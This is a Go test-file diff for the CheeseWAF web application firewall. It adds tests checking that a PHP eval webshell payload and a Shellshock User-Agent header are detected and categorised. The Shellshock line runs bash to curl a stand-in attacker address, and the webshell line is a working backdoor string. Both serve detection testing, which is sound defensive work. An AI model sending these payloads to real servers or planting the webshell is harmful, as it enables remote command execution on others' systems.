@@ -29,6 +29,7 @@ import (
 	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
 	"github.com/LaokeQwQ/CheeseWAF/internal/monitor"
 	"github.com/LaokeQwQ/CheeseWAF/internal/realtime"
+	"github.com/LaokeQwQ/CheeseWAF/internal/security"
 	"github.com/LaokeQwQ/CheeseWAF/internal/setup"
 	"github.com/LaokeQwQ/CheeseWAF/internal/storage"
 	"github.com/LaokeQwQ/CheeseWAF/internal/timekeeper"
@@ -1179,6 +1180,107 @@ func TestBuildPipelineWiresRCEUmbrellaCategories(t *testing.T) {
 				t.Fatalf("expected detector %q, got %+v", tc.detectorID, result)
 			}
 		})
+	}
+}
+
+// The analyzer's webshell category was never mounted, so `webshell: true` had
+// no production effect: the payload below only reached the separate
+// protection.webshell detector mounted under the RCE umbrella. With RCE off,
+// detection must come from the semantic analyzer itself.
+func TestBuildPipelineWiresWebshellSemanticCategory(t *testing.T) {
+	const payload = `<?php eval($_POST['cmd']); ?>`
+	buildFor := func(enabled bool) *engine.Pipeline {
+		t.Helper()
+		cfg := &config.Config{Sites: []config.SiteConfig{{
+			ID:      "default",
+			Enabled: true,
+			WAF: config.WAFConfig{
+				Enabled:         true,
+				Mode:            "block",
+				ParanoiaLevel:   3,
+				SemanticEngines: config.SemanticEngineSwitches{Webshell: enabled},
+			},
+		}}}
+		pipeline, err := buildPipeline(cfg)
+		if err != nil {
+			t.Fatal(err)
+		}
+		return pipeline
+	}
+	detect := func(pipeline *engine.Pipeline) *engine.DetectionResult {
+		t.Helper()
+		req, err := http.NewRequest(http.MethodPost, "/upload.php", bytes.NewBufferString(payload))
+		if err != nil {
+			t.Fatal(err)
+		}
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		reqCtx, err := engine.NewRequestContext(req, "default")
+		if err != nil {
+			t.Fatal(err)
+		}
+		result, err := pipeline.Detect(context.Background(), reqCtx)
+		if err != nil {
+			t.Fatal(err)
+		}
+		return result
+	}
+
+	result := detect(buildFor(true))
+	if result == nil || !result.Detected || result.Category != "webshell" {
+		t.Fatalf("webshell payload was not detected by the semantic analyzer: %+v", result)
+	}
+	if result.DetectorID != "semantic.analyzer.webshell" {
+		t.Fatalf("expected semantic analyzer webshell detector, got %q", result.DetectorID)
+	}
+
+	if disabled := detect(buildFor(false)); disabled != nil && disabled.Detected {
+		t.Fatalf("webshell switch off still detected: %+v", disabled)
+	}
+}
+
+// The analyzer emits shellshock hits from the log4shell detector but the
+// category was missing from DetectionCategories, so a runtime hit landed outside
+// the reporting set and per-category statistics drifted from detection.
+func TestBuildPipelineKeepsShellshockHitInsideReportedCategories(t *testing.T) {
+	cfg := &config.Config{Sites: []config.SiteConfig{{
+		ID:      "default",
+		Enabled: true,
+		WAF: config.WAFConfig{
+			Enabled:         true,
+			Mode:            "block",
+			ParanoiaLevel:   3,
+			SemanticEngines: config.SemanticEngineSwitches{RCE: true},
+		},
+	}}}
+	pipeline, err := buildPipeline(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	req, err := http.NewRequest(http.MethodGet, "/cgi-bin/status", nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	req.Header.Set("User-Agent", `() { :;}; /bin/bash -c "curl http://203.0.113.5/x"`)
+	reqCtx, err := engine.NewRequestContext(req, "default")
+	if err != nil {
+		t.Fatal(err)
+	}
+	result, err := pipeline.Detect(context.Background(), reqCtx)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if result == nil || !result.Detected || result.Category != "shellshock" {
+		t.Fatalf("expected shellshock detection, got %+v", result)
+	}
+	reported := false
+	for _, category := range security.DetectionCategories {
+		if category == result.Category {
+			reported = true
+			break
+		}
+	}
+	if !reported {
+		t.Fatalf("runtime category %q is missing from DetectionCategories: %v", result.Category, security.DetectionCategories)
 	}
 }
 
